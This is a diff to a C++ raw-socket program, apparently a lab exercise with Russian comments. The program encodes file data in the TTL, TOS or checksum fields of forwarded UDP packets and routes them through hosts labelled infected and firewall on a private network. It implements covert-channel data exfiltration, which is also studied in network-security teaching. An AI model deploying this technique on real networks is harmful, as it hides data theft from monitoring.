@@ -23,23 +23,23 @@
 
 enum HOSTS {
     HOST_INVALID = -1,
-    HOST_COVERT_CHANNEL,
     HOST_EXT,
-    HOST_PROXY,
+    HOST_FIREWALL,
+    HOST_INFECTED,
     HOST_INT
 };
 enum METHODS { INVALID_METHOS = -1, TTL, QOS, CHECKSUM };
 
 static const char ADDRS[][16] = {
-    "192.168.1.11", "192.168.1.11", "192.168.1.12", "192.168.1.10"};
-static const int PORTS[]            = {9091, 9090, 9090, 9090};
+    "192.168.1.11", "192.168.1.12", "192.168.1.12", "192.168.1.10"};
+static const int PORTS[]            = {9091, 9091, 9090, 9090};
 
 static const u_int32_t INET_ADDRS[] = {
-    inet_addr(ADDRS[HOST_COVERT_CHANNEL]), inet_addr(ADDRS[HOST_EXT]),
-    inet_addr(ADDRS[HOST_PROXY]), inet_addr(ADDRS[HOST_INT])};
+    inet_addr(ADDRS[HOST_EXT]), inet_addr(ADDRS[HOST_FIREWALL]),
+    inet_addr(ADDRS[HOST_INFECTED]), inet_addr(ADDRS[HOST_INT])};
 static const u_int16_t INET_PORTS[] = {
-    htons(PORTS[HOST_COVERT_CHANNEL]), htons(PORTS[HOST_EXT]),
-    htons(PORTS[HOST_PROXY]), htons(PORTS[HOST_INT])};
+    htons(PORTS[HOST_EXT]), htons(PORTS[HOST_FIREWALL]),
+    htons(PORTS[HOST_INFECTED]), htons(PORTS[HOST_INT])};
 
 enum RANGES { R_MIN, R_MAX };
 static const __uint16_t TTL_VAL[2] = {32, 128};
@@ -145,32 +145,19 @@ static __uint16_t IPChecksum(__uint16_t* addr, __uint32_t nwords) {
 // Реализация типа прокси (нет): переадресовывает пакеты изнутри вовне
 HOSTS proxyDeployment(int& sock) {
     // UDP
-    if (iph->protocol != 17) return HOST_INVALID;
-
+    if (iph->protocol != 17 || udph->dest != INET_PORTS[HOST_INFECTED])
+        return HOST_INVALID;
     HOSTS dest_host;
     const auto& saddr(iph->saddr);
 
-    dest_host =
-        saddr != INET_ADDRS[HOST_EXT] ? dest_host = HOST_EXT : HOST_INVALID;
+    dest_host = saddr != INET_ADDRS[HOST_EXT] ? dest_host = HOST_FIREWALL
+                                              : HOST_INVALID;
 
     if (dest_host == HOST_INVALID) return HOST_INVALID;
 
     // Меняем адрес назначения в самом фрейме
-    iph->daddr = INET_ADDRS[dest_host];
-
-    struct sockaddr_in dest_addr;
-    socklen_t dest_addrlen    = sizeof(dest_addr);
-    dest_addr.sin_family      = AF_INET;
-    dest_addr.sin_addr.s_addr = INET_ADDRS[dest_host];
-    dest_addr.sin_port        = INET_PORTS[dest_host];
-
-    if (sendto(
-            sock, buffer, ntohs(iph->tot_len), 0, (struct sockaddr*)&dest_addr,
-            dest_addrlen
-        ) < 0) {
-        perror("sendto() error: ");
-        exit(3);
-    }
+    iph->daddr = INET_ADDRS[HOST_FIREWALL];
+    udph->dest = INET_PORTS[HOST_FIREWALL];
 
     return dest_host;
 }
@@ -217,9 +204,8 @@ static bool QOSImplementation(
               << std::hex << __uint16_t(iph->tos) << " to " << __uint16_t(byte)
               << std::dec << std::endl;
 
-    // Отправляем новый пакет по скрытому каналу
-    iph->daddr = INET_ADDRS[HOST_COVERT_CHANNEL];
-    udph->dest = INET_PORTS[HOST_COVERT_CHANNEL];
+    iph->daddr = INET_ADDRS[HOST_EXT];
+    udph->dest = INET_PORTS[HOST_EXT];
     iph->tos   = byte;
 
     if (sendto(
@@ -251,9 +237,15 @@ static bool TTLImplementation(
         std::cout << "Flows listening...\n";
         avarage_ttl += iph->ttl;
         ++cur_pkt;
+        if (sendto(
+                sock, buffer, ntohs(iph->tot_len), 0,
+                (struct sockaddr*)&dest_addr, dest_addrlen
+            ) < 0) {
+            perror("sendto() error: ");
+            exit(3);
+        }
         return 0;
-    }
-    if (cur_pkt == waiting_period) {
+    } else if (cur_pkt == waiting_period) {
         ++cur_pkt;
         avarage_ttl /= waiting_period;
         std::cout << "Average TTL field value: " << avarage_ttl << std::endl;
@@ -314,13 +306,10 @@ static bool TTLImplementation(
         bytes_transmissed = 0;
     }
 
-    // Отправляем новый пакет по скрытому каналу
-    iph->daddr = INET_ADDRS[HOST_COVERT_CHANNEL];
-    udph->dest = INET_PORTS[HOST_COVERT_CHANNEL];
-    auto& ttl  = iph->ttl;
-    ttl        = bit == 0x00       ? ttl <= avarage_ttl ? ttl : avarage_ttl
-               : ttl > avarage_ttl ? ttl
-                                   : avarage_ttl + 1;
+    auto& ttl = iph->ttl;
+    ttl       = bit == 0x00       ? ttl <= avarage_ttl ? ttl : avarage_ttl
+              : ttl > avarage_ttl ? ttl
+                                  : avarage_ttl + 1;
 
     if (sendto(
             sock, buffer, ntohs(iph->tot_len), 0, (struct sockaddr*)&dest_addr,
@@ -340,7 +329,6 @@ static bool CHECKSUMImplementation(
     int& sock, const std::string& filename, const size_type& size,
     const std::string& data, std::string::const_iterator& iter
 ) {
-    if (udph->dest != ntohs(9090)) return 0;
     static __uint8_t bit_ind;
     std::bitset<1> bit = 0;
     int is_finished    = TRANS_NOT;
@@ -397,7 +385,7 @@ static bool CHECKSUMImplementation(
 
     // Отправляем новый пакет по скрытому каналу
     // iph->daddr           = INET_ADDRS[HOST_COVERT_CHANNEL];
-    udph->dest           = INET_PORTS[HOST_COVERT_CHANNEL];
+    udph->dest           = INET_PORTS[HOST_EXT];
 
     const auto& checksum = iph->check;
     auto& ttl            = iph->ttl;
@@ -420,7 +408,9 @@ static bool CHECKSUMImplementation(
     return in_progress == TRANS_FINISHED ? true : false;
 }
 
-typedef bool (*fn)(int&, const std::string&, const size_type&, const std::string&, std::string::const_iterator&);
+typedef bool (*fn
+)(int&, const std::string&, const size_type&, const std::string&,
+  std::string::const_iterator&);
 // Возвращают 0, если передача в рамках текущей сессии продолжается, и 1,
 // если завершена (был передан последний байт сообщения)
 static fn implementations[] = {
@@ -458,8 +448,8 @@ int main(int argc, char* argv[]) {
     auto iter                 = data.begin();
 
     dest_addr.sin_family      = AF_INET;
-    dest_addr.sin_addr.s_addr = INET_ADDRS[HOST_COVERT_CHANNEL];
-    dest_addr.sin_port        = INET_PORTS[HOST_COVERT_CHANNEL];
+    dest_addr.sin_addr.s_addr = INADDR_ANY;
+    dest_addr.sin_port        = INET_PORTS[HOST_FIREWALL];
 
     HEADLINE("Start of Forwarding.\n");
     in_progress = TRANS_FILENAME;
@@ -471,8 +461,7 @@ int main(int argc, char* argv[]) {
         );
         if (valread <= 0) break;
 
-        auto dest_host = proxyDeployment(sock);
-        if (dest_host == HOST_INVALID) continue;
+        if (proxyDeployment(sock) == HOST_INVALID) continue;
 
         is_finished =
             implementations[method](sock, filename, file_size, data, iter);
